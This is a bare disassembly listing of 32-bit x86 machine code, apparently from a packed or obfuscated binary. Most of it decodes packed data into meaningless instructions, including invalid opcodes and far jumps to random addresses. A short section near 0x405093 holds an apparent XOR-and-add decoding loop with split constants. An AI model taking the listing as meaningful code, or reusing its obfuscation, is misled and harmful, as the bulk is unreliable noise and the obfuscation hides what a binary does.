  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e787,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	jns    0x404a01
  4049bd:	jb     0x404994
  4049bf:	leave  
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0xb170707d
  4049c8:	jnp    0x4049d3
  4049ca:	xor    BYTE PTR [ebx+0x33],0x4e
  4049ce:	push   eax
  4049cf:	out    dx,eax
  4049d0:	cli    
  4049d1:	sbb    al,0x8a
  4049d3:	lea    edx,ds:0x27e07749
  4049d9:	call   0x628c:0xf4326c58
  4049e0:	(bad)  
  4049e1:	retf   
  4049e2:	stc    
  4049e3:	xlat   BYTE PTR ds:[ebx]
  4049e4:	and    al,0x4b
  4049e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049e7:	push   ebp
  4049e8:	stc    
  4049e9:	fiadd  WORD PTR [edx]
  4049eb:	jns    0x4049a8
  4049ed:	fmul   DWORD PTR [ebp-0x5f3323a2]
  4049f3:	sub    edi,DWORD PTR [esi+0x1e175d9]
  4049f9:	cdq    
  4049fa:	sbb    esi,DWORD PTR [edx]
  4049fc:	jecxz  0x404a1c
  4049fe:	sar    DWORD PTR [eax+ecx*1],0x3f
  404a02:	in     eax,dx
  404a03:	adc    ebp,esp
  404a05:	lock fst DWORD PTR [esi-0x4c663b86]
  404a0c:	add    al,0xa4
  404a0e:	mov    edx,0x88b5585e
  404a13:	test   al,0x2e
  404a16:	aad    0x51
  404a18:	bound  ebx,QWORD PTR [ecx+0x5b]
  404a1b:	ret    0x14cb
  404a1e:	sbb    al,0xad
  404a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a21:	mov    BYTE PTR [ecx+0x7407b25],bh
  404a27:	cmp    ecx,DWORD PTR [eax+0x53]
  404a2a:	jge    0x404a4b
  404a2c:	out    0x4f,al
  404a2e:	mov    ebx,0x6f1d27c0
  404a33:	out    0xcd,eax
  404a35:	retf   0x14ba
  404a38:	dec    edx
  404a39:	inc    edx
  404a3a:	mov    DWORD PTR [ebp-0x2c],0x8db914e4
  404a41:	aaa    
  404a42:	sbb    al,0xdd
  404a44:	imul   DWORD PTR [esp+eiz*2]
  404a47:	mov    eax,ds:0x2f8dcb22
  404a4c:	cwde   
  404a4d:	add    DWORD PTR [esi+ecx*4-0x7],0x53
  404a52:	mov    dh,0xef
  404a54:	push   edi
  404a55:	fcom   DWORD PTR [ebp+0x7f5d044d]
  404a5b:	cmp    BYTE PTR [edi-0x134ecb2f],bl
  404a61:	cli    
  404a62:	jecxz  0x4049f3
  404a64:	stos   DWORD PTR es:[edi],eax
  404a65:	outs   dx,BYTE PTR ds:[esi]
  404a66:	push   0x82822402
  404a6b:	inc    ebp
  404a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a6d:	cwde   
  404a6e:	adc    BYTE PTR [ebx],dh
  404a70:	mov    bh,0xca
  404a72:	out    0x49,eax
  404a74:	sbb    DWORD PTR [edi+edx*2-0x856e21c],edi
  404a7b:	jmp    0x404a8f
  404a7d:	sbb    BYTE PTR [edx],bl
  404a7f:	inc    ebp
  404a80:	pop    edi
  404a81:	add    eax,0xb84af2d3
  404a86:	(bad)  
  404a87:	push   ss
  404a88:	cmp    dl,cl
  404a8a:	int    0x36
  404a8c:	inc    ebx
  404a8d:	sub    edi,DWORD PTR fs:[edx]
  404a90:	xchg   edx,eax
  404a91:	jmp    0x404a43
  404a93:	add    ebp,edi
  404a95:	inc    esi
  404a96:	and    eax,edi
  404a98:	add    al,0xed
  404a9a:	push   edi
  404a9b:	cdq    
  404a9c:	sbb    eax,0x44b94ffe
  404aa1:	repz jmp DWORD PTR [ecx+0x7c]
  404aa5:	bound  ebp,QWORD PTR ds:0xdd34f8cb
  404aab:	xlat   BYTE PTR ds:[ebx]
  404aac:	and    ch,al
  404aae:	shl    BYTE PTR [esi+0x6a],0x4f
  404ab2:	maxps  xmm1,XMMWORD PTR [ecx-0x53]
  404ab6:	sbb    esp,DWORD PTR [ecx+esi*4]
  404ab9:	ss int3 
  404abb:	inc    ebx
  404abc:	mov    esp,0x10586fd
  404ac1:	ret    
  404ac2:	ins    DWORD PTR es:[edi],dx
  404ac3:	shl    edx,0x48
  404ac6:	in     al,0x81
  404ac8:	mov    ecx,0xde60ba6d
  404acd:	mov    edx,0x810b9adb
  404ad2:	mov    ds:0x479c5131,eax
  404ad7:	push   edi
  404ad8:	cmp    ah,al
  404ada:	push   edx
  404adb:	jae    0x404abb
  404add:	nop
  404ade:	mov    edx,0x7597a491
  404ae3:	mov    al,0x35
  404ae5:	std    
  404ae6:	add    al,BYTE PTR [esi]
  404ae8:	fdivr  DWORD PTR [edx]
  404aea:	cli    
  404aeb:	jne    0x404acd
  404aed:	pusha  
  404aee:	or     ch,BYTE PTR [ebp-0x9fc74d1]
  404af4:	outs   dx,DWORD PTR ds:[esi]
  404af5:	jmp    0xe09cf1ad
  404afa:	test   BYTE PTR [esi],dh
  404afc:	jmp    0x1fde6e
  404b01:	scas   eax,DWORD PTR es:[edi]
  404b02:	mov    ecx,0x3d804573
  404b07:	cdq    
  404b08:	scas   eax,DWORD PTR es:[edi]
  404b09:	add    DWORD PTR [edi-0x69ee675c],ecx
  404b0f:	inc    ebp
  404b10:	lahf   
  404b11:	jp     0x404abe
  404b13:	xor    DWORD PTR [edi+0x711fe888],ebp
  404b19:	cmp    DWORD PTR ds:0xb706d252,edx
  404b1f:	jle    0x404ac9
  404b21:	or     edx,ebx
  404b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b24:	sahf   
  404b25:	dec    ecx
  404b26:	xor    dh,BYTE PTR [edi-0x3b]
  404b29:	(bad)  
  404b2a:	xchg   edx,eax
  404b2b:	iret   
  404b2c:	xor    edi,edi
  404b2e:	jmp    0xa1a0:0x3571ad05
  404b35:	jmp    0x404b4f
  404b37:	rcr    BYTE PTR [ecx+edx*1+0x41],0x80
  404b3c:	adc    al,0x0
  404b3e:	lods   eax,DWORD PTR ds:[esi]
  404b3f:	lahf   
  404b40:	push   0x7706cb7a
  404b45:	jge    0x404b07
  404b47:	jecxz  0x404b07
  404b49:	xchg   ebx,ebx
  404b4b:	jne    0x404b91
  404b4d:	repnz in eax,dx
  404b4f:	enter  0x1895,0x5b
  404b53:	fistp  QWORD PTR [eax+0x44172b78]
  404b59:	iret   
  404b5a:	aad    0xc4
  404b5c:	icebp  
  404b5d:	pusha  
  404b5e:	inc    ebx
  404b5f:	adc    BYTE PTR [edi+0x4e2f49c6],bh
  404b65:	mov    bl,0x4c
  404b67:	gs cld 
  404b69:	mov    ah,0xcb
  404b6b:	jg     0x404b5d
  404b6d:	into   
  404b6e:	sub    edi,DWORD PTR [ebp+0x5256c2e0]
  404b74:	xor    edi,DWORD PTR ds:0x63ae7b99
  404b7a:	xchg   ebp,eax
  404b7b:	enter  0x9c44,0x81
  404b7f:	cmp    ch,BYTE PTR [edx+0x60]
  404b82:	sub    eax,0x41cf1196
  404b87:	adc    esi,DWORD PTR [edi+0x7]
  404b8a:	xor    eax,0x991a07c6
  404b8f:	test   al,0xe4
  404b91:	in     eax,dx
  404b92:	aam    0x99
  404b94:	dec    edx
  404b95:	jo     0x404b21
  404b97:	pop    edi
  404b98:	(bad)  [ebx]
  404b9a:	dec    eax
  404b9b:	mov    ds,ebp
  404b9d:	cli    
  404b9e:	sub    cl,BYTE PTR [ecx-0x377cf18]
  404ba4:	push   0xffffffa2
  404ba6:	xor    al,0x81
  404ba8:	in     al,0xc0
  404baa:	aas    
  404bab:	jae    0x404bd2
  404bad:	inc    esi
  404bae:	fst    st(2)
  404bb0:	imul   edx,DWORD PTR [edx],0x6f86dce7
  404bb6:	xchg   DWORD PTR [edi+0x17],ebx
  404bb9:	jmp    0xabc2eae1
  404bbe:	popf   
  404bbf:	shl    DWORD PTR ss:[edi+0x5b],0xa8
  404bc4:	dec    edx
  404bc5:	popf   
  404bc6:	jbe    0x404c1c
  404bc8:	and    dh,bl
  404bca:	pop    ebp
  404bcb:	push   ebp
  404bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bcd:	add    al,0xa8
  404bcf:	pop    esi
  404bd0:	add    cl,bh
  404bd2:	jmp    0x5c0fc302
  404bd7:	mov    ds:0x7aa1f0be,eax
  404bdc:	jne    0x404c47
  404bde:	or     edi,ebp
  404be0:	add    dh,BYTE PTR [esp+ebp*2+0x6f6a52d6]
  404be7:	mov    ch,0xdf
  404be9:	jle    0x404b7a
  404beb:	and    BYTE PTR [edx-0x51f864b],bl
  404bf1:	(bad)
  404bf4:	data16 out dx,al
  404bf6:	or     ch,BYTE PTR [ecx+0x2be34aea]
  404bfc:	mov    ds:0x9619afa0,eax
  404c01:	call   DWORD PTR [edi+edx*1-0x534908b8]
  404c08:	sub    bh,BYTE PTR [ebx+0x62244621]
  404c0e:	sbb    esp,DWORD PTR [ebx+0x37]
  404c11:	cmp    al,0xa8
  404c14:	pop    ebx
  404c16:	mov    esi,0x873c9f50
  404c1b:	ins    BYTE PTR es:[edi],dx
  404c1c:	cld    
  404c1d:	loope  0x404c98
  404c1f:	add    ah,BYTE PTR [edx+0x57]
  404c22:	xor    esp,DWORD PTR [edi]
  404c24:	leave  
  404c25:	cmp    DWORD PTR [ecx],0xfffffff5
  404c28:	jmp    0xeff:0x8d0c7340
  404c2f:	and    BYTE PTR [ecx+0x58],cl
  404c32:	push   ebx
  404c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c34:	shl    BYTE PTR [eax-0x72],cl
  404c37:	mov    ds:0x31a992db,al
  404c3c:	pop    ds
  404c3d:	pop    esi
  404c3e:	xor    DWORD PTR [ebx],edi
  404c40:	adc    BYTE PTR [ebp-0x43651e7b],al
  404c46:	and    eax,0x539addcf
  404c4b:	jmp    0x1261a051
  404c50:	in     al,0xa6
  404c52:	mov    dl,0xa5
  404c54:	jnp    0x404c51
  404c56:	call   0xd47a:0xe96da7ed
  404c5d:	imul   ebx,ebx,0x36
  404c60:	mov    ds:0x813b2a30,eax
  404c65:	adc    al,0x97
  404c67:	bound  esi,QWORD PTR [edx-0x5d]
  404c6a:	aad    0x4
  404c6c:	push   0xed165f27
  404c71:	outs   dx,BYTE PTR ds:[esi]
  404c72:	xlat   BYTE PTR ds:[ebx]
  404c73:	enter  0x64b5,0x78
  404c77:	ficom  WORD PTR [edi]
  404c79:	mov    eax,0xc01a516b
  404c7e:	cmp    eax,0x228a2909
  404c83:	adc    ch,ch
  404c85:	nop
  404c86:	lods   al,BYTE PTR ds:[esi]
  404c87:	push   cs
  404c88:	dec    edx
  404c89:	mov    al,BYTE PTR [ebp+0x770c9fb8]
  404c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c90:	inc    esp
  404c91:	cs jnp 0x404c14
  404c94:	xor    al,0x60
  404c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c97:	lods   eax,DWORD PTR ds:[esi]
  404c98:	and    BYTE PTR ds:0xac9d46ba,0xa8
  404c9f:	push   es
  404ca0:	mov    ebp,0x9bf5f3e5
  404ca5:	pusha  
  404ca6:	cmp    al,0x99
  404ca8:	hlt    
  404ca9:	mov    ecx,0xd00206e9
  404cae:	or     ebp,esi
  404cb0:	push   ss
  404cb1:	and    esp,edx
  404cb3:	cs retf 0xf7b5
  404cb7:	sbb    dh,0x5d
  404cba:	sub    DWORD PTR [esi-0x3b],ebx
  404cbd:	xor    ch,ch
  404cbf:	lods   eax,DWORD PTR ds:[esi]
  404cc0:	outs   dx,BYTE PTR ds:[esi]
  404cc1:	mov    ebx,0x185f3b01
  404cc6:	ret    0xdab3
  404cc9:	in     eax,0x2f
  404ccb:	add    BYTE PTR [esi+0x274f83cc],bh
  404cd1:	pop    eax
  404cd2:	sbb    BYTE PTR ds:0xf0be6737,0xad
  404cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cda:	ret    
  404cdb:	sbb    DWORD PTR [edi-0x16],esi
  404cde:	(bad)  
  404cdf:	push   esi
  404ce0:	inc    edx
  404ce1:	arpl   WORD PTR [edi-0x5a],sp
  404ce4:	outs   dx,DWORD PTR ds:[esi]
  404ce5:	xor    bl,BYTE PTR [edi]
  404ce7:	inc    ecx
  404ce8:	lds    esi,FWORD PTR [edx+0x75b3fb00]
  404cee:	mov    gs,WORD PTR [esi-0x5a]
  404cf1:	mov    edx,0x826bd30a
  404cf6:	push   cs
  404cf7:	inc    edx
  404cf8:	cdq    
  404cf9:	sar    DWORD PTR ds:0x1dadace1,cl
  404cff:	pop    esp
  404d00:	shr    ebp,cl
  404d02:	cwde   
  404d03:	cld    
  404d04:	je     0x404d17
  404d06:	int    0x23
  404d08:	xor    eax,0xc7c7031f
  404d0d:	add    eax,0x42e77f
  404d12:	pop    eax
  404d13:	push   cs
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e76b,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x24]
  404d39:	jns    0x404d05
  404d3b:	retf   
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0xf270707d
  404d45:	sub    DWORD PTR [edi-0x22f6b31a],0x1b
  404d4c:	mov    cl,0xc5
  404d4e:	adc    al,0x39
  404d50:	in     eax,0x4d
  404d52:	js     0x404da9
  404d54:	(bad)  
  404d55:	mov    ch,0xf4
  404d57:	jmp    0x404d73
  404d59:	hlt    
  404d5a:	ins    DWORD PTR es:[edi],dx
  404d5b:	mov    al,0x65
  404d5d:	cmp    dh,ch
  404d5f:	mov    esp,0x159c19f4
  404d64:	xchg   DWORD PTR [ebx+0x56],ebx
  404d67:	dec    esi
  404d68:	int3   
  404d69:	or     BYTE PTR [edi-0x2],al
  404d6c:	out    dx,eax
  404d6d:	(bad)  
  404d6e:	cld    
  404d6f:	outs   dx,DWORD PTR ds:[esi]
  404d70:	add    BYTE PTR [esi+0x48],bh
  404d73:	je     0x404d5f
  404d75:	adc    al,0x61
  404d77:	sub    esp,esp
  404d79:	repz mov ecx,0xf2987c1
  404d7f:	pop    esp
  404d80:	in     eax,0x81
  404d82:	adc    eax,0x55541fd
  404d87:	cld    
  404d88:	push   ebx
  404d89:	sar    DWORD PTR [edi+eax*8],1
  404d8c:	pusha  
  404d8d:	and    esp,esi
  404d8f:	rcr    BYTE PTR [edi+0x45],1
  404d92:	xchg   esi,edx
  404d94:	enter  0x4434,0x69
  404d98:	mov    ch,0x50
  404d9a:	push   ebp
  404d9b:	sar    BYTE PTR [edx-0x37],1
  404d9e:	stc    
  404d9f:	mov    esi,0x9a06ac3
  404da4:	dec    ebp
  404da5:	mov    dl,0x3e
  404da7:	call   0xe5b:0xd3122678
  404dae:	sub    al,0x22
  404db0:	pop    esi
  404db1:	sahf   
  404db2:	ins    BYTE PTR es:[edi],dx
  404db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404db4:	addr16 add bl,0x7c
  404db8:	lods   al,BYTE PTR ds:[esi]
  404db9:	inc    esp
  404dba:	aaa    
  404dbb:	loopne 0x404ddf
  404dbd:	jns    0x404e18
  404dbf:	retf   0xa240
  404dc2:	sahf   
  404dc3:	cmp    eax,0xe49342f1
  404dc8:	fcmovnbe st,st(1)
  404dca:	inc    eax
  404dcb:	daa    
  404dcc:	mov    dh,0xc7
  404dce:	fild   WORD PTR [ecx-0x55842a55]
  404dd4:	ja     0x404d84
  404dd6:	ss mov dl,0x5b
  404dd9:	push   edx
  404dda:	and    al,0x8f
  404ddc:	in     eax,0xc5
  404dde:	mov    ebx,esi
  404de0:	(bad)  
  404de1:	sbb    esp,DWORD PTR [edx-0x3b]
  404de4:	mov    al,0x9c
  404de6:	mov    ds:0x4593dbac,eax
  404deb:	inc    ebx
  404dec:	jne    0x404e07
  404dee:	cmp    BYTE PTR [edi],ah
  404df0:	sub    dl,ah
  404df2:	cmp    esp,edx
  404df4:	popa   
  404df5:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404df7:	out    dx,eax
  404df8:	or     DWORD PTR [edi],esp
  404dfa:	jns    0x404dde
  404dfc:	and    al,0xf8
  404dfe:	mov    dh,0x3c
  404e00:	cli    
  404e01:	xor    DWORD PTR [eax+ebx*4+0x5c],esi
  404e05:	aam    0xaa
  404e07:	mov    ch,0x85
  404e09:	and    al,0x4e
  404e0b:	or     eax,0x96f31396
  404e10:	rcl    DWORD PTR [esi+0x2c74c47c],1
  404e16:	cmp    DWORD PTR [ecx+0xf8eec62],edx
  404e1c:	clc    
  404e1d:	and    al,0xf
  404e1f:	js     0x404e5f
  404e21:	fnstcw WORD PTR [eax+0x4e]
  404e24:	inc    eax
  404e25:	lea    ebx,[ecx-0x2cd2f01e]
  404e2b:	sub    eax,0x4fa72494
  404e30:	cmp    DWORD PTR [ebx-0x23b115b0],esi
  404e36:	fmul   QWORD PTR [ebp+ebp*2-0x19c5a85]
  404e3d:	fdivr  QWORD PTR ds:0xb9bb2018
  404e43:	repnz fdiv DWORD PTR [esi]
  404e46:	test   al,0x63
  404e48:	dec    eax
  404e49:	xor    BYTE PTR [edx+0x5b],ah
  404e4c:	fldenv [ebx-0x2921aa9]
  404e52:	jl     0x404e6c
  404e54:	ds jecxz 0x404ec8
  404e57:	mov    bl,0x82
  404e59:	div    DWORD PTR [ebx+0x1a945f56]
  404e5f:	fmul   DWORD PTR [ebx+esi*2+0x7195da9]
  404e66:	push   ds
  404e67:	or     edx,esi
  404e69:	dec    esp
  404e6a:	pop    ebp
  404e6b:	sti    
  404e6c:	sbb    DWORD PTR [ecx],edx
  404e6e:	test   DWORD PTR [ecx],ebp
  404e70:	push   eax
  404e71:	loop   0x404e94
  404e73:	sub    DWORD PTR [edx-0x8dcaef6],eax
  404e79:	jg     0x404e1d
  404e7b:	leave  
  404e7c:	dec    esi
  404e7d:	sub    dh,bl
  404e7f:	mov    eax,ds:0x5daea94c
  404e84:	push   eax
  404e85:	xchg   BYTE PTR [edi],al
  404e87:	(bad)  
  404e88:	loopne 0x404e76
  404e8a:	mov    esi,DWORD PTR [esp+ebp*1+0x92c8cbf]
  404e91:	and    edx,DWORD PTR [esi-0x50]
  404e94:	mov    ah,0x6c
  404e96:	das    
  404e97:	inc    ebx
  404e98:	jl     0x404ec1
  404e9a:	xlat   BYTE PTR ds:[ebx]
  404e9b:	leave  
  404e9c:	outs   dx,BYTE PTR ds:[esi]
  404e9d:	inc    ebx
  404e9e:	mov    eax,ds:0x7e71b031
  404ea3:	xlat   BYTE PTR ds:[ebx]
  404ea4:	addr16 sbb eax,0xae1b8ec1
  404eaa:	leave  
  404eab:	pop    edx
  404eac:	gs call 0xd429:0x5b42885e
  404eb4:	inc    ecx
  404eb5:	pop    ss
  404eb6:	and    al,0xd
  404eb8:	ror    dh,1
  404eba:	inc    ebx
  404ebb:	aam    0xcd
  404ebd:	and    DWORD PTR [eax-0x11],esp
  404ec0:	mov    ebx,0x5ec54653
  404ec5:	mov    eax,ds:0x909d72c9
  404eca:	mov    bh,0x6b
  404ecc:	es jns 0x404e98
  404ecf:	push   cs
  404ed0:	cwde   
  404ed1:	mov    ch,0xc9
  404ed3:	cli    
  404ed4:	ins    BYTE PTR es:[edi],dx
  404ed5:	jmp    0x404f18
  404ed7:	mov    DWORD PTR ds:0xfd21d661,edi
  404edd:	pushf  
  404ede:	and    al,0x4
  404ee0:	shr    DWORD PTR [edi],0xe
  404ee3:	mov    edx,cr1
  404ee6:	xchg   eax,ebp
  404ee8:	mov    ebx,0x2ae3f512
  404eed:	popa   
  404eee:	xchg   DWORD PTR [ecx],esp
  404ef0:	aad    0xdc
  404ef2:	inc    edi
  404ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ef4:	repnz mov al,0x15
  404ef7:	lods   al,BYTE PTR ds:[esi]
  404ef8:	test   al,0x50
  404efa:	push   edx
  404efb:	bound  ebx,QWORD PTR [esi+0xc0ba2cb]
  404f01:	xor    eax,0x1a8e21
  404f06:	and    eax,0x9e244b48
  404f0b:	xor    al,0x6
  404f0d:	imul   esi,DWORD PTR [ebx-0x4e],0x4a
  404f11:	sar    BYTE PTR [ebx-0x2adb2616],0xb6
  404f18:	mov    WORD PTR ds:0x235e4058,cs
  404f1e:	add    DWORD PTR [ecx],ecx
  404f20:	mov    ds:0x29952fc9,al
  404f25:	jle    0x404f27
  404f27:	mov    ebp,0x3cc65540
  404f2c:	rol    BYTE PTR [edi-0x19],cl
  404f2f:	ror    BYTE PTR ds:0x9fc1ea0d,1
  404f35:	retf   0x448b
  404f38:	cmp    BYTE PTR ds:0x151ef895,dh
  404f3e:	cmp    al,0x6a
  404f40:	out    dx,eax
  404f41:	daa    
  404f42:	ja     0x404f81
  404f44:	ficom  DWORD PTR [esi]
  404f46:	lahf   
  404f47:	jnp    0x404fa9
  404f49:	test   al,0x9e
  404f4b:	es nop
  404f4d:	(bad)  
  404f4e:	xchg   edx,eax
  404f4f:	loope  0x404f68
  404f51:	fidiv  DWORD PTR [ebx+0x4b]
  404f54:	xchg   DWORD PTR [esp+edx*4-0x6cd24a12],ebp
  404f5b:	inc    esi
  404f5c:	addr16 jl 0x404fcb
  404f5f:	push   eax
  404f60:	(bad)  
  404f61:	cmp    edx,DWORD PTR [esi]
  404f63:	shl    BYTE PTR [edx-0xe16e68b],1
  404f69:	mov    WORD PTR ds:[edx-0x785177be],fs
  404f70:	mov    edi,0x8436c036
  404f75:	or     ebp,DWORD PTR [edi-0x315b0c3f]
  404f7b:	(bad)  
  404f7c:	jp     0x404fb9
  404f7e:	pop    eax
  404f7f:	mov    al,ds:0x7c57b03b
  404f84:	test   al,0xce
  404f86:	mov    al,dh
  404f88:	int    0x9f
  404f8a:	sbb    DWORD PTR [edi+0x50f7d92b],ebp
  404f90:	jl     0x404f27
  404f92:	cmp    ecx,esp
  404f94:	push   ebx
  404f95:	add    esp,DWORD PTR [edx]
  404f97:	inc    ebx
  404f98:	nop
  404f99:	adc    esp,esp
  404f9b:	fs ret 0xa01
  404f9f:	sub    dh,BYTE PTR [ebx-0x40794e40]
  404fa5:	mov    eax,ds:0xffe57796
  404faa:	(bad)
  404fae:	enter  0x1d29,0x11
  404fb2:	stc    
  404fb3:	ja     0x404f3e
  404fb5:	in     al,dx
  404fb6:	jp     0x405012
  404fb8:	aam    0xe1
  404fba:	in     eax,dx
  404fbb:	lods   eax,DWORD PTR ds:[esi]
  404fbc:	pop    ebx
  404fbd:	pop    edi
  404fbe:	sub    al,0x56
  404fc0:	sub    ebx,ebx
  404fc2:	out    dx,eax
  404fc3:	sbb    al,cl
  404fc5:	mov    WORD PTR [ecx],fs
  404fc7:	add    al,0x33
  404fc9:	xchg   esp,eax
  404fca:	ja     0x405028
  404fcc:	out    dx,al
  404fcd:	xchg   ebx,eax
  404fce:	pop    es
  404fcf:	and    ah,cl
  404fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fd2:	outs   dx,DWORD PTR ds:[esi]
  404fd3:	jo     0x404f6d
  404fd5:	inc    ebx
  404fd6:	xchg   ebp,eax
  404fd7:	inc    edi
  404fd8:	dec    ebp
  404fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fda:	pop    edi
  404fdb:	xchg   BYTE PTR [edi-0x13a206ef],bl
  404fe1:	mov    cl,0x42
  404fe3:	cmp    BYTE PTR [ebx],al
  404fe5:	jns    0x404fd6
  404fe7:	imul   eax,ecx,0x9da8cf05
  404fed:	inc    ebx
  404fee:	je     0x40504e
  404ff0:	xchg   ecx,eax
  404ff1:	adc    cl,BYTE PTR [ecx]
  404ff3:	mov    WORD PTR [edi+0x1a9c0df],cs
  404ff9:	or     DWORD PTR [ebx+0x2d43b307],edi
  404fff:	inc    esp
  405000:	in     al,0xb5
  405002:	and    al,0x91
  405004:	mov    gs,ecx
  405006:	lods   al,BYTE PTR ds:[esi]
  405007:	mov    ch,0x7d
  405009:	call   0x9027:0xbb2dcdee
  405010:	in     al,0xd8
  405012:	jns    0x405033
  405014:	(bad)  
  405016:	xchg   ecx,eax
  405017:	dec    ebx
  405018:	push   cs
  405019:	dec    edi
  40501a:	test   eax,0x51043d8c
  40501f:	dec    ebp
  405020:	loopne 0x405067
  405022:	jne    0x404fe0
  405024:	retf   
  405025:	jg     0x404faf
  405027:	lds    edx,FWORD PTR [edx-0x1c5f8f25]
  40502d:	loope  0x405051
  40502f:	inc    eax
  405030:	cmp    dl,BYTE PTR [edi-0x499047f2]
  405036:	js     0x40507f
  405038:	push   edi
  405039:	pop    ebp
  40503a:	cmp    bl,BYTE PTR [ecx]
  40503c:	fs std 
  40503e:	xor    BYTE PTR [ebp+ebp*1+0xa],dh
  405042:	aam    0x16
  405044:	(bad)  
  405045:	dec    eax
  405046:	xor    BYTE PTR [ebp-0x59277ba9],0x1
  40504d:	xchg   ebx,eax
  40504e:	loop   0x4050ad
  405050:	sti    
  405051:	ds pop esi
  405053:	push   ebp
  405054:	leave  
  405055:	pusha  
  405056:	xor    al,0x75
  405058:	call   FWORD PTR [esp+ebp*8-0x66b9f022]
  40505f:	test   bh,ch
  405061:	lahf   
  405062:	mov    WORD PTR [edi+0x7b6173a0],gs
  405068:	cmp    bl,0x15
  40506b:	and    BYTE PTR [eax+esi*1+0xbb6780],al
  405072:	cmp    BYTE PTR [esp+edx*2],dl
  405075:	leave  
  405076:	daa    
  405077:	(bad)  
  405078:	jg     0x405077
  40507a:	xchg   BYTE PTR [eax+0x6ed01df7],dh
  405080:	xchg   esp,eax
  405081:	in     eax,0x38
  405083:	in     al,dx
  405084:	mov    esi,0x458b1ae7
  405089:	hlt    
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shr    DWORD PTR ds:0x53d77504,0x2b
  405137:	jo     0x4051a9
  405139:	cmp    eax,0x3f70707d
  40513e:	pusha  
  40513f:	xor    DWORD PTR [edi+0x4d414e1d],eax
  405145:	jnp    0x40513f
  405147:	push   0x59
  405149:	mov    eax,0x40c5bbfc
  40514e:	or     dl,bh
  405150:	cmp    DWORD PTR [ecx+ecx*2-0x62],edi
  405154:	add    eax,ecx
  405156:	or     al,0x2c
  405158:	jmp    0x6c94d804
  40515d:	neg    DWORD PTR [ebx-0x4f6ff623]
  405163:	pop    esi
  405164:	pushf  
  405165:	cdq    
  405166:	mov    al,ds:0x10b5c44d
  40516b:	lahf   
  40516c:	inc    ebp
  40516d:	mov    dh,0x8
  40516f:	(bad)  
  405170:	ds int3 
  405172:	push   0xc986de86
  405177:	push   0xce21dc0
  40517c:	add    ebx,DWORD PTR [ebx]
  40517e:	out    dx,eax
  40517f:	xlat   BYTE PTR ds:[ebx]
  405180:	add    eax,0xdd02f303
  405185:	fnstenv [edx+0x41]
